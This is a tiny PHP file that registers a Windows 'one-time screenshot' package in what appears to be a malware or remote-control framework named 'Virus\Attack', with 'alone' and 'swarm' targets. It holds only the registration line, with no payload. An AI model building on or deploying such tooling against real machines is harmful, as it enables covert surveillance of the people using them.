<?php

use Kelvinho\Virus\Attack\Classes;
use Kelvinho\Virus\Attack\PackageRegistrar;

PackageRegistrar::register("win.oneTime.Screenshot", "\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\Screenshot\\Screenshot", "easy.Screenshot", __DIR__, [Classes::WINDOWS_ALONE, Classes::WINDOWS_SWARM], "Takes a screenshot");